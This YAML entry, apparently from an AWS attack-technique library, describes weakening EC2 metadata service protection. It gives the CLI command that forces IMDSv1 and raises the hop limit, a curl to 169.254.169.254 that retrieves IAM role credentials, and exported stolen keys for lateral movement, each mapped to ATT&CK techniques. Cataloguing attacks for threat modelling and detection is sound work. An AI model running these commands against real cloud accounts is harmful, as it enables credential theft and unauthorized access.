attack:
  id: 'aws-ec2-modify-imds-options-001'
  name: 'EC2 Instance Metadata Service Protection Weakening'
  overview: |
    An attacker with the ec2:ModifyInstanceMetadataOptions permission can weaken Instance Metadata Service (IMDS) security controls on EC2 instances. By modifying IMDS configuration, the attacker can force the use of IMDSv1 (by setting HttpTokens to optional), which lacks session-based authentication, or increase the HttpPutResponseHopLimit value. Raising the hop limit is particularly dangerous as it allows the metadata endpoint (169.254.169.254) to be accessed beyond the VM's immediate network namespace, enabling containers, proxies, or other processes to reach IMDS and exfiltrate temporary IAM role credentials attached to the instance.
  steps:
    - title: 'Weaken IMDS Security Configuration'
      command: |
        aws ec2 modify-instance-metadata-options \
          --instance-id <INSTANCE_ID> \
          --http-tokens optional \
          --http-endpoint enabled \
          --http-put-response-hop-limit 2
      dependencies:
        - 'ec2:ModifyInstanceMetadataOptions permission'
        - 'Valid AWS credentials with access to target account'
        - 'Knowledge of target EC2 instance ID'
        - 'Target instance must be in running or stopped state'
      result: |
        IMDS protection is weakened: IMDSv1 is now allowed (HttpTokens set to optional), and the hop limit is increased to 2, allowing metadata requests to traverse an additional network hop beyond the instance itself.
      ttp: 'T1562.001 - Impair Defenses: Disable or Modify Tools'
    - title: 'Access IMDS from Container or Proxy Process'
      command: |
        curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE_NAME>
      dependencies:
        - 'Access to a container, proxy, or process running on or adjacent to the target instance'
        - 'Network path to the metadata endpoint with increased hop limit'
        - 'Knowledge of IAM role name attached to instance (can be enumerated)'
      result: |
        Temporary IAM credentials (AccessKeyId, SecretAccessKey, and SessionToken) are retrieved from the instance metadata service, which can be used to assume the instance's IAM role permissions.
      ttp: 'T1552.005 - Unsecured Credentials: Cloud Instance Metadata API'
    - title: 'Utilize Stolen Credentials for Lateral Movement'
      command: |
        export AWS_ACCESS_KEY_ID=<stolen-access-key>
        export AWS_SECRET_ACCESS_KEY=<stolen-secret-key>
        export AWS_SESSION_TOKEN=<stolen-session-token>
        aws sts get-caller-identity
      dependencies:
        - 'Successfully exfiltrated temporary credentials from previous step'
        - 'AWS CLI or SDK installed on attacker system'
        - 'Network access to AWS APIs'
      result: |
        Attacker confirms valid credential theft and can now operate with the IAM role permissions assigned to the compromised EC2 instance, potentially accessing S3 buckets, databases, secrets, or other AWS resources.
      ttp: 'T1078.004 - Valid Accounts: Cloud Accounts'
  stride_goal:
    - 'Tampering'
    - 'Information Disclosure'
    - 'Elevation of Privilege'